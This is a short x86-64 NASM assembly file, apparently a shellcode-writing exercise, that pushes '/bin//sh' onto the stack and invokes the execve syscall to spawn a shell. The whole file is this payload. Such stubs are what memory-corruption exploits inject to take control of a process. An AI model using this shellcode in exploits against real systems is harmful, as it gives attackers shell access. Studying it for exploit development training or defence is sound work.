; File: execve-stack.nasm

global _start

section .text

_start:

    xor rax, rax
    push rax                    ; First NULL push
    mov rbx, 0x68732f2f6e69622f ; >>> '/bin//sh'[::-1].encode('hex')
    push rbx                    ; push /bin//sh in reverse
    mov rdi, rsp                ; store /bin//sh address in RDI
    push rax                    ; Second NULL push
    mov rdx, rsp                ; set RDX
    push rdi                    ; Push address of /bin//sh
    mov rsi, rsp                ; set RSI
    add rax, 59
    syscall                     ; Call the Execve syscall
